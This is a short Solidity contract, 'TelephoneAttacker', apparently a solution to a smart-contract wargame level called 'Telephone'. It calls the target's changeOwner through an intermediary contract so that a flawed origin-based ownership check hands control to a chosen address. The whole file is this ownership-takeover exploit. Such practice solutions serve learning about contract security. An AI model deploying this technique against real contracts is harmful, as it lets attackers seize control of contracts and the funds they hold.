// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
  ITelephone private challenge;
  address private newOwner;

  constructor(address _challengeAddress, address _newOwner) {
    challenge = ITelephone(_challengeAddress);
    newOwner = _newOwner;
  }

  function attack() external {
    challenge.changeOwner(newOwner);
  }
}